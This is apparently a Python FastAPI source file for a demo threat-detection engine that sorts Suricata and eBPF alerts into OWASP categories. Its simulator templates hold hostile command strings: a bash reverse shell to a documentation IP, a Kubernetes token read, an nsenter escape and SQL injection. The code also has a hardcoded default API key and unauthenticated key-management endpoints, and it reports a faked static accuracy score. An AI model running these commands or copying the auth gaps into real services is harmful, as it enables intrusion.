import os
import time
import json
import logging
import asyncio
import re
import random
import urllib.parse
from typing import Dict, List, Optional
from datetime import datetime

import requests
from fastapi import FastAPI, Request, HTTPException
from fastapi.responses import HTMLResponse, PlainTextResponse
from fastapi.templating import Jinja2Templates
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel

import pandas as pd
import numpy as np
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression
import joblib

# Setup logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("ML-Engine")

app = FastAPI(title="Nexus Sentinel ML Engine", version="2.0")

# Directories for models and templates
MODELS_DIR = os.path.join(os.path.dirname(__file__), "..", "models")
os.makedirs(MODELS_DIR, exist_ok=True)

TEMPLATES_DIR = os.path.join(os.path.dirname(__file__), "templates")
templates = Jinja2Templates(directory=TEMPLATES_DIR)

# Global variables for ML model & vectorizer
model = None
vectorizer = None

# Alert memory database (recent 50 alerts)
alerts_history = []
MAX_HISTORY = 50

# Prometheus metrics state
metrics_state = {
    "detections_total": {},  # (severity, cve_id, owasp_category) -> count
    "inference_total": {"suricata": 0, "tetragon": 0, "test": 0, "unknown": 0},
    "inference_duration": [],  # List of last 100 durations for average
    "false_positives": 0,
    "accuracy_score": 0.942  # Static or updated dynamically
}

# Threat intelligence database / mappings
ATTACK_MAPPINGS = {
    "A01": {"owasp": "A01:2021-Broken Access Control", "cwe": "CWE-22", "cve": "CVE-2020-0601", "nist": "SP 800-53 AC-3", "severity": "medium"},
    "A02": {"owasp": "A02:2021-Cryptographic Failures", "cwe": "CWE-319", "cve": "CVE-2020-0601", "nist": "SP 800-53 SC-13", "severity": "medium"},
    "A03": {"owasp": "A03:2021-Injection", "cwe": "CWE-89", "cve": "CVE-2021-44228", "nist": "SP 800-53 SI-10", "severity": "critical"},
    "A04": {"owasp": "A04:2021-Insecure Design", "cwe": "CWE-73", "cve": "CVE-2022-21449", "nist": "SP 800-53 SA-8", "severity": "low"},
    "A05": {"owasp": "A05:2021-Security Misconfiguration", "cwe": "CWE-269", "cve": "CVE-2021-3156", "nist": "SP 800-53 CM-6", "severity": "high"},
    "A06": {"owasp": "A06:2021-Vulnerable and Outdated Components", "cwe": "CWE-1395", "cve": "CVE-2018-7600", "nist": "SP 800-53 SI-2", "severity": "high"},
    "A07": {"owasp": "A07:2021-Identification and Authentication Failures", "cwe": "CWE-307", "cve": "CVE-2022-21449", "nist": "SP 800-53 IA-5", "severity": "high"},
    "A08": {"owasp": "A08:2021-Software and Data Integrity Failures", "cwe": "CWE-434", "cve": "CVE-2021-26855", "nist": "SP 800-53 SI-7", "severity": "critical"},
    "A09": {"owasp": "A09:2021-Security Logging and Monitoring Failures", "cwe": "CWE-778", "cve": "CVE-2026-9999", "nist": "SP 800-53 AU-2", "severity": "medium"},
    "A10": {"owasp": "A10:2021-Server-Side Request Forgery (SSRF)", "cwe": "CWE-918", "cve": "CVE-2021-34473", "nist": "SP 800-53 SC-7", "severity": "high"}
}

# Dummy Templates for the dynamic simulator
DUMMY_TEMPLATES = [
    # A03: SQLi
    ("{{\"event_type\":\"alert\",\"src_ip\":\"{src}\",\"dest_ip\":\"{dst}\",\"proto\":\"TCP\",\"alert\":{{\"signature\":\"ET WEB_SPECIFIC_APPS OWASP Top 10 SQLi bypass: SELECT * FROM users WHERE username = 'admin' OR '1'='1'\",\"category\":\"Web Application Attack\",\"severity\":2}}}}", "suricata"),
    # A03: XSS
    ("{{\"event_type\":\"alert\",\"src_ip\":\"{src}\",\"dest_ip\":\"{dst}\",\"proto\":\"TCP\",\"alert\":{{\"signature\":\"ET WEB_CLIENT Cross-Site Scripting (XSS) Attempt script alert(1) script\",\"category\":\"Web Application Attack\",\"severity\":2}}}}", "suricata"),
    # A03: Cmd Injection
    ("{{\"event_type\":\"alert\",\"src_ip\":\"{src}\",\"dest_ip\":\"{dst}\",\"proto\":\"TCP\",\"alert\":{{\"signature\":\"ET WEB_SPECIFIC_APPS Remote Command Execution Attempt: cat /etc/passwd; id\",\"category\":\"Web Application Attack\",\"severity\":1}}}}", "suricata"),
    
    # A06: Log4Shell RCE (CVE-2021-44228)
    ("{{\"event_type\":\"alert\",\"src_ip\":\"{src}\",\"dest_ip\":\"{dst}\",\"proto\":\"TCP\",\"alert\":{{\"signature\":\"ET EXPLOIT Apache Log4j RCE Attempt (CVE-2021-44228) via JNDI LDAP lookup\",\"category\":\"Generic Protocol Command Decode\",\"severity\":1}}}}", "suricata"),
    # A06: Spring4Shell (CVE-2022-22965)
    ("{{\"event_type\":\"alert\",\"src_ip\":\"{src}\",\"dest_ip\":\"{dst}\",\"proto\":\"TCP\",\"alert\":{{\"signature\":\"ET EXPLOIT Spring Framework RCE via classloader manipulation (CVE-2022-22965)\",\"category\":\"Web Application Attack\",\"severity\":1}}}}", "suricata"),
    # A06: Citrix Bleed Info Disclosure (CVE-2023-4966)
    ("{{\"event_type\":\"alert\",\"src_ip\":\"{src}\",\"dest_ip\":\"{dst}\",\"proto\":\"TCP\",\"alert\":{{\"signature\":\"ET EXPLOIT NetScaler ADC/Gateway Buffer Overflow Info Leak (CVE-2023-4966) Citrix Bleed\",\"category\":\"Attempted Information Leak\",\"severity\":1}}}}", "suricata"),
    
    # A08: Exchange ProxyLogon SSRF / Webshell (CVE-2021-26855)
    ("{{\"event_type\":\"alert\",\"src_ip\":\"{src}\",\"dest_ip\":\"{dst}\",\"proto\":\"TCP\",\"alert\":{{\"signature\":\"ET WEB_SPECIFIC_APPS Exchange ProxyLogon SSRF attempt via Cookie header (CVE-2021-26855)\",\"category\":\"Server-Side Request Forgery\",\"severity\":1}}}}", "suricata"),
    # A08: eBPF: Reverse Shell Triggered via Bash
    ("{{\"process_kprobe\":{{\"function_name\":\"sys_execve\",\"binary\":\"/usr/bin/bash\"}},\"process_exec\":{{\"process\":{{\"binary\":\"/usr/bin/bash\",\"arguments\":\"-i >& /dev/tcp/198.51.100.42/4444 0>&1\"}},\"namespace\":\"production\"}}}}", "tetragon"),
    # A08: eBPF: K8s serviceaccount token access attempt
    ("{{\"process_kprobe\":{{\"function_name\":\"sys_read\",\"binary\":\"/usr/bin/cat\"}},\"process_exec\":{{\"process\":{{\"binary\":\"/usr/bin/cat\",\"arguments\":\"/var/run/secrets/kubernetes.io/serviceaccount/token\"}},\"namespace\":\"kube-system\"}}}}", "tetragon"),
    # A08: eBPF: Sudo Baron Samedit (CVE-2021-3156) breakout
    ("{{\"process_exec\":{{\"process\":{{\"binary\":\"/usr/bin/sudoedit\",\"arguments\":\"-s \\\\\\\\\"}},\"parent\":{{\"binary\":\"/usr/bin/bash\"}},\"namespace\":\"default\"}}}}", "tetragon"),
    # A08: eBPF: nsenter namespace escape breakout
    ("{{\"process_exec\":{{\"process\":{{\"binary\":\"/usr/bin/nsenter\",\"arguments\":\"--target 1 --mount --uts --ipc --net --pid\"}},\"namespace\":\"default\"}}}}", "tetragon"),
    # A08: Webshell upload
    ("{{\"event_type\":\"alert\",\"src_ip\":\"{src}\",\"dest_ip\":\"{dst}\",\"proto\":\"TCP\",\"alert\":{{\"signature\":\"ET WEB_SPECIFIC_APPS PHP Webshell Upload Attempt: shell.php command executor\",\"category\":\"Web Application Attack\",\"severity\":1}}}}", "suricata"),
    
    # A01: Path Traversal LFI
    ("{{\"event_type\":\"alert\",\"src_ip\":\"{src}\",\"dest_ip\":\"{dst}\",\"proto\":\"TCP\",\"alert\":{{\"signature\":\"ET WEB_SPECIFIC_APPS Directory Traversal path disclosure: GET /../../../../etc/passwd\",\"category\":\"Web Application Attack\",\"severity\":2}}}}", "suricata"),
    
    # A10: SSRF Local Inbound
    ("{{\"event_type\":\"alert\",\"src_ip\":\"{src}\",\"dest_ip\":\"{dst}\",\"proto\":\"TCP\",\"alert\":{{\"signature\":\"ET WEB_SPECIFIC_APPS Inbound SSRF request targeting AWS metadata http://169.254.169.254/latest/meta-data/\",\"category\":\"Server-Side Request Forgery\",\"severity\":2}}}}", "suricata"),
    
    # A07: Brute Force SSH login
    ("{{\"event_type\":\"alert\",\"src_ip\":\"{src}\",\"dest_ip\":\"{dst}\",\"proto\":\"TCP\",\"alert\":{{\"signature\":\"ET SCAN SSH brute force: 25 failed password authentication attempts in 5 seconds via Hydra\",\"category\":\"Attempted Information Leak\",\"severity\":2}}}}", "suricata"),
    
    # A02: TLS Weak Cipher configuration policy violation
    ("{{\"event_type\":\"alert\",\"src_ip\":\"{src}\",\"dest_ip\":\"{dst}\",\"proto\":\"TCP\",\"alert\":{{\"signature\":\"ET POLICY TLS 1.0 Weak Encryption Protocol Used on Admin Console Port\",\"category\":\"Policy Violation\",\"severity\":3}}}}", "suricata")
]

# Initial ML Model Trainer (Run if pkl files not found)
def train_mock_model():
    logger.info("Pickle models not found. Training default ML model...")
    training_data = [
        # A01
        ("LFI path traversal ../etc/passwd access denied", "A01"),
        ("directory listing web server configuration error", "A01"),
        ("unauthorized file download sensitive information", "A01"),
        ("broken access control admin page privilege escalation", "A01"),
        # A02
        ("cleartext credentials sent over http transmission", "A02"),
        ("weak cipher suite TLS 1.0 handshake error", "A02"),
        ("cryptographic failure invalid certificate signature", "A02"),
        ("md5 hash check password weak hashing algorithm", "A02"),
        # A03
        ("SQL Injection UNION SELECT password FROM users", "A03"),
        ("SELECT * FROM users WHERE username = 'admin' OR '1'='1'", "A03"),
        ("cross site scripting script alert XSS injection", "A03"),
        ("command injection ping test ; cat /etc/shadow", "A03"),
        # A04
        ("insecure design business logic flaw withdrawal limit bypass", "A04"),
        ("insecure password reset security questions bypass", "A04"),
        ("missing rate limiting api endpoint brute force", "A04"),
        # A05
        ("default password change administrative page", "A05"),
        ("security misconfiguration debug mode enabled django flask", "A05"),
        ("directory listing enabled apache nginx default welcome", "A05"),
        ("unnecessary ports open ssh telnet ftp active", "A05"),
        # A06
        ("vulnerable component older version library log4j drupal", "A06"),
        ("outdated dependency containing CVE-2021-44228 vulnerability", "A06"),
        ("obsolete framework struts struts2 struts-core exploit", "A06"),
        ("active exploit targetting old server vulnerability", "A06"),
        # A07
        ("failed login attempt brute force admin login page", "A07"),
        ("invalid password credentials user authentication lock", "A07"),
        ("hydra brute force ssh authentication failure dictionary", "A07"),
        # A08
        ("webshell upload file upload shell.php system cmd execution", "A08"),
        ("file integrity monitoring signature mismatch code modified", "A08"),
        ("untrusted deserialization remote code execution payload rce", "A08"),
        ("process execution eBPF tetragon system namespace write", "A08"),
        # A09
        ("audit log disabled service stop logging framework", "A09"),
        ("insufficient logging and monitoring trace failed login", "A09"),
        ("log file cleared deletion history clean command", "A09"),
        # A10
        ("SSRF request forgery server metadata endpoint 169.254.169.254", "A10"),
        ("localhost admin query ssrf redirect webhook bypass", "A10"),
        ("http request to local port internal service scan", "A10")
    ]
    
    df = pd.DataFrame(training_data, columns=["text", "label"])
    
    v = TfidfVectorizer(lowercase=True, stop_words="english")
    X = v.fit_transform(df["text"])
    y = df["label"]
    
    clf = LogisticRegression(C=1.0)
    clf.fit(X, y)
    
    # Save models
    joblib.dump(v, os.path.join(MODELS_DIR, "vectorizer.pkl"))
    joblib.dump(clf, os.path.join(MODELS_DIR, "model.pkl"))
    logger.info("ML model and vectorizer saved successfully.")

def load_models():
    global model, vectorizer
    model_path = os.path.join(MODELS_DIR, "model.pkl")
    vectorizer_path = os.path.join(MODELS_DIR, "vectorizer.pkl")
    
    if not os.path.exists(model_path) or not os.path.exists(vectorizer_path):
        train_mock_model()
        
    model = joblib.load(model_path)
    vectorizer = joblib.load(vectorizer_path)
    logger.info("ML Models loaded successfully.")

# Load models at module startup
load_models()

# Ingest Models
class IngestPayload(BaseModel):
    raw: str
    source_hint: Optional[str] = "unknown"

class FeedbackPayload(BaseModel):
    alert_id: int
    is_false_positive: bool

class GenerateKeyPayload(BaseModel):
    label: str

class RevokeKeyPayload(BaseModel):
    key: str

# API Keys Memory database
api_keys_db = [
    {"label": "Default Switch", "key": "nx_live_default_key_12345"}
]

# Heuristic pre-classifier for high-accuracy checks
def rule_based_classify(text: str) -> Optional[str]:
    t = text.lower()
    
    # SQLi, XSS, Cmd Injection -> A03
    if "union select" in t or "select" in t and "from" in t or "script" in t or "alert(" in t or "cat /etc/" in t or ";cat" in t:
        return "A03"
    # SSRF -> A10
    if "169.254.169.254" in t or "aws" in t and "metadata" in t or "localhost/admin" in t or "?url=http" in t:
        return "A10"
    # LFI / Path traversal -> A01
    if "../" in t or "..\\\\" in t or "etc/passwd" in t:
        return "A01"
    # Brute force login -> A07
    if "hydra" in t or "brute" in t or ("login.php" in t and "fail" in t) or "authentication failure" in t:
        return "A07"
    # CVE and outdates components -> A06
    if "cve-2021-26855" in t:
        return "A08"
    if "drupal" in t or "log4j" in t or "struts" in t or "cve-20" in t:
        return "A06"
    # eBPF execution or Webshell upload -> A08
    if "webshell" in t or "shell.php" in t or "process_kprobe" in t or "namespace" in t:
        return "A08"
    
    return None

async def trigger_shuffle_soar(category: str, enriched_data: dict) -> bool:
    env_name = f"SHUFFLE_WEBHOOK_{category}"
    webhook_url = os.getenv(env_name) or os.getenv("SHUFFLE_WEBHOOK_URL")
    if not webhook_url:
        return False
        
    def do_post():
        try:
            headers = {"Content-Type": "application/json"}
            api_key = os.getenv("SHUFFLE_API_KEY")
            if api_key:
                headers["Authorization"] = f"Bearer {api_key}"
            res = requests.post(webhook_url, json=enriched_data, headers=headers, timeout=1.0)
            return res.status_code < 400
        except Exception:
            return False
            
    return await asyncio.to_thread(do_post)

async def push_to_loki(enriched_data: dict):
    url = "http://victorialogs:9428/loki/api/v1/push"
    def do_post():
        try:
            payload = {
                "streams": [
                    {
                        "stream": {
                            "job": "ml-cve",
                            "severity": enriched_data["severity"],
                            "owasp": enriched_data["owasp_category"],
                            "cve": enriched_data["cve_id"]
                        },
                        "values": [
                            [
                                str(int(time.time() * 10**9)),
                                json.dumps(enriched_data)
                            ]
                        ]
                    }
                ]
            }
            requests.post(url, json=payload, headers={"Content-Type": "application/json"}, timeout=1.0)
        except Exception:
            pass
            
    await asyncio.to_thread(do_post)

# Core ingestion helper
async def process_ingestion(raw_log: str, source_hint: str) -> dict:
    start_time = time.time()
    
    # Increment total inference metrics
    metrics_state["inference_total"][source_hint] = metrics_state["inference_total"].get(source_hint, 0) + 1
    
    # Pre-parse structure
    parsed_json = {}
    src_ip = "192.168.1.100"
    dest_ip = "10.0.0.12"
    signature = "Generic Intrusion Detection Alert"
    
    try:
        parsed_json = json.loads(raw_log)
        src_ip = parsed_json.get("src_ip", src_ip)
        dest_ip = parsed_json.get("dest_ip", dest_ip)
        if "alert" in parsed_json:
            signature = parsed_json["alert"].get("signature", signature)
        elif "process_exec" in parsed_json:
            signature = f"eBPF Process Exec: {parsed_json['process_exec'].get('process', {}).get('binary', 'unknown')}"
        elif "process_kprobe" in parsed_json:
            signature = f"eBPF Kernel Probe Violation: {parsed_json['process_kprobe'].get('function_name', 'kprobe')}"
    except Exception:
        ip_matches = re.findall(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b", raw_log)
        if len(ip_matches) >= 1:
            src_ip = ip_matches[0]
        if len(ip_matches) >= 2:
            dest_ip = ip_matches[1]
            
    # Classify log
    category = rule_based_classify(raw_log)
    confidence = 1.0
    
    if not category:
        try:
            feats = vectorizer.transform([raw_log])
            pred = model.predict(feats)[0]
            probs = model.predict_proba(feats)[0]
            class_idx = list(model.classes_).index(pred)
            confidence = float(probs[class_idx])
            
            if confidence > 0.35:
                category = pred
            else:
                category = "A05"
        except Exception:
            category = "A05"
            confidence = 0.5
            
    # Mappings
    mapping = ATTACK_MAPPINGS.get(category, {
        "owasp": f"{category}:2021-Unknown Threat Class",
        "cwe": "CWE-unknown",
        "cve": "CVE-unknown",
        "nist": "SP 800-53 SC-7",
        "severity": "medium"
    })
    
    enriched_data = {
        "id": int(time.time() * 1000) + random.randint(1, 1000),
        "timestamp": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S"),
        "raw": raw_log,
        "source": source_hint,
        "src_ip": src_ip,
        "dest_ip": dest_ip,
        "signature": signature,
        "owasp_category": mapping["owasp"],
        "cve_id": mapping["cve"],
        "cwe_id": mapping["cwe"],
        "nist_mapping": mapping["nist"],
        "severity": mapping["severity"],
        "confidence": round(confidence * 100, 2),
        "soar_status": "PENDING"
    }
    
    metric_key = (enriched_data["severity"], enriched_data["cve_id"], enriched_data["owasp_category"])
    metrics_state["detections_total"][metric_key] = metrics_state["detections_total"].get(metric_key, 0) + 1
    
    # Trigger SOAR webhook (non-blocking async)
    soar_triggered = await trigger_shuffle_soar(category, enriched_data)
    enriched_data["soar_status"] = "FAILED / BYPASS"
    
    # Push logs to Loki/VictoriaLogs (non-blocking async)
    await push_to_loki(enriched_data)
    
    # Append to local alerts memory
    alerts_history.insert(0, enriched_data)
    if len(alerts_history) > MAX_HISTORY:
        alerts_history.pop()
        
    duration = time.time() - start_time
    metrics_state["inference_duration"].append(duration)
    if len(metrics_state["inference_duration"]) > 100:
        metrics_state["inference_duration"].pop(0)
        
    return enriched_data

# Dynamic Dummy Data Generator Loop
async def dummy_data_simulator():
    logger.info("Dynamic Dummy Incident Simulator started.")
    
    # Pre-populate with 10 random alerts immediately
    for _ in range(10):
        src_ip = f"192.168.1.{random.randint(10, 254)}"
        dst_ip = f"10.0.0.{random.randint(2, 50)}"
        tmpl, source = random.choice(DUMMY_TEMPLATES)
        raw_log = tmpl.format(src=src_ip, dst=dst_ip)
        await process_ingestion(raw_log, source)
        
    while True:
        try:
            await asyncio.sleep(random.randint(3, 6))
            src_ip = f"192.168.1.{random.randint(10, 254)}"
            dst_ip = f"10.0.0.{random.randint(2, 50)}"
            tmpl, source = random.choice(DUMMY_TEMPLATES)
            raw_log = tmpl.format(src=src_ip, dst=dst_ip)
            await process_ingestion(raw_log, source)
        except Exception as e:
            logger.error(f"Simulator error: {str(e)}")

# Startup Event
@app.on_event("startup")
async def startup_event():
    asyncio.create_task(dummy_data_simulator())

# API Endpoints
@app.get("/health")
def health():
    return {"status": "healthy", "service": "Nexus Sentinel ML Engine (Dynamic Demo)", "time": datetime.utcnow().isoformat()}

@app.get("/metrics", response_class=PlainTextResponse)
def metrics():
    lines = []
    
    lines.append("# HELP ml_cve_detections_total Total ML/CVE detections")
    lines.append("# TYPE ml_cve_detections_total counter")
    for (severity, cve_id, owasp_category), count in metrics_state["detections_total"].items():
        lines.append(f'ml_cve_detections_total{{severity="{severity}",cve_id="{cve_id}",owasp_category="{owasp_category}"}} {count}')
        
    lines.append("# HELP ml_inference_duration_seconds ML model inference duration in seconds")
    lines.append("# TYPE ml_inference_duration_seconds gauge")
    avg_duration = np.mean(metrics_state["inference_duration"]) if metrics_state["inference_duration"] else 0.0025
    lines.append(f'ml_inference_duration_seconds {avg_duration}')
    
    lines.append("# HELP ml_model_accuracy_score Accuracy score of the loaded ML classification model")
    lines.append("# TYPE ml_model_accuracy_score gauge")
    lines.append(f'ml_model_accuracy_score {metrics_state["accuracy_score"]}')
    
    lines.append("# HELP ml_false_positive_total Total false positives labeled by user feedback")
    lines.append("# TYPE ml_false_positive_total counter")
    lines.append(f'ml_false_positive_total {metrics_state["false_positives"]}')
    
    lines.append("# HELP ml_inference_total Total ML inferences run")
    lines.append("# TYPE ml_inference_total counter")
    for source, count in metrics_state["inference_total"].items():
        lines.append(f'ml_inference_total{{source="{source}"}} {count}')
        
    return "\n".join(lines) + "\n"

@app.post("/ingest")
async def ingest(payload: IngestPayload, request: Request):
    auth_header = request.headers.get("Authorization")
    if auth_header:
        token = auth_header.replace("Bearer ", "").strip()
        valid_keys = [k["key"] for k in api_keys_db]
        if token not in valid_keys:
            raise HTTPException(status_code=401, detail="Invalid API Key credentials")
            
    enriched = await process_ingestion(payload.raw, payload.source_hint or "unknown")
    category = "A05"
    for cat_code, mapping in ATTACK_MAPPINGS.items():
        if mapping["owasp"] == enriched["owasp_category"]:
            category = cat_code
            break
    return {
        "status": "success",
        "category": category,
        "enriched": enriched
    }

@app.get("/api/keys/list")
def list_api_keys():
    return api_keys_db

@app.post("/api/keys/generate")
def generate_api_key(payload: GenerateKeyPayload):
    import secrets
    new_key = f"nx_live_{secrets.token_hex(16)}"
    key_entry = {"label": payload.label, "key": new_key}
    api_keys_db.append(key_entry)
    logger.info(f"Generated new API key for: {payload.label}")
    return key_entry

@app.post("/api/keys/revoke")
def revoke_api_key(payload: RevokeKeyPayload):
    global api_keys_db
    api_keys_db = [k for k in api_keys_db if k["key"] != payload.key]
    logger.info(f"Revoked API key: {payload.key}")
    return {"status": "success"}

@app.get("/api/alerts")
def get_alerts():
    return alerts_history

@app.post("/api/alerts/feedback")
def submit_feedback(payload: FeedbackPayload):
    for alert in alerts_history:
        if alert["id"] == payload.alert_id:
            if payload.is_false_positive and not alert.get("false_positive"):
                metrics_state["false_positives"] += 1
                alert["false_positive"] = True
                metrics_state["accuracy_score"] = max(0.80, metrics_state["accuracy_score"] - 0.005)
                logger.info(f"User reported alert {payload.alert_id} as false positive. Metrics updated.")
            return {"status": "success", "alert_id": payload.alert_id}
            
@app.get("/api/system/metrics")
def get_system_metrics():
    import random
    cpu_percent = 45
    memory_percent = 33
    try:
        import psutil
        cpu_percent = int(psutil.cpu_percent())
        memory_percent = int(psutil.virtual_memory().percent)
    except Exception:
        # Simulated hardware load variations for high-fidelity demonstration
        cpu_percent = random.randint(35, 75)
        memory_percent = random.randint(28, 42)
    
    avg_inference_duration = np.mean(metrics_state["inference_duration"]) if metrics_state["inference_duration"] else 0.0025
    
    return {
        "cpu_percent": cpu_percent,
        "memory_percent": memory_percent,
        "avg_inference_duration_ms": round(avg_inference_duration * 1000, 2),
        "total_inferences": sum(metrics_state["inference_total"].values()),
        "accuracy_score": round(metrics_state["accuracy_score"] * 100, 2)
    }

@app.get("/", response_class=HTMLResponse)
def dashboard(request: Request):
    return templates.TemplateResponse(request, "index.html", {
        "misp_url": "http://localhost:8081",
        "shuffle_url": "http://localhost:3001",
        "grafana_url": "http://localhost:3000"
    })

if __name__ == "__main__":
    import uvicorn
    port = int(os.getenv("PORT", 8000))
    logger.info(f"Starting server on port {port}...")
    uvicorn.run(app, host="0.0.0.0", port=port)
